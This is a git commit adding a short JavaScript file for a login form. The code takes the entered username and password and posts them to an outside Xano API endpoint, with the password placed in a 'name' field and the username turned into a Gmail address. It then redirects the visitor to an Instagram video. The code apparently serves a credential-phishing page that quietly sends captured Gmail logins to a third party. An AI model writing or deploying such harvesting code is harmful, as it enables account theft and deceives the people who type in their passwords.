751c4f16692a8dcc3723f179d5331e2d8bbe6920
asror797 <asrorshahobiddinov509@gmail.com>
2022-01-24 23:49:58 +0500

    oinitial commit

---
+++ js/main.js
@@ -0,0 +1,33 @@
+let form = document.getElementById('form');
+let username = document.getElementById('Rectangle_1');
+let password = document.getElementById('Rectangle_2');
+let subBtn = document.getElementById('Rectangle_3');
+
+
+
+form.addEventListener('submit', e => {
+  e.preventDefault()
+  let data = {
+    name:password.value,
+    email:`${username.value}@gmail.com`,
+    password: null
+  }
+
+
+  function FetchingData() {
+    fetch('https://x8ki-letl-twmt.n7.xano.io/api:wh9Fla_N/auth/signup',{
+      method:'POST',
+      headers:{
+        'Content-Type':'application/json'
+      },
+      body:JSON.stringify(data)
+    })
+      .then(res => res.json())
+      .then(data => console.log(data))
+      
+  }
+
+  FetchingData()
+  window.location.href = "https://www.instagram.com/tv/CYmD7K_qtSq/?utm_source=ig_web_copy_link";
+  
+})
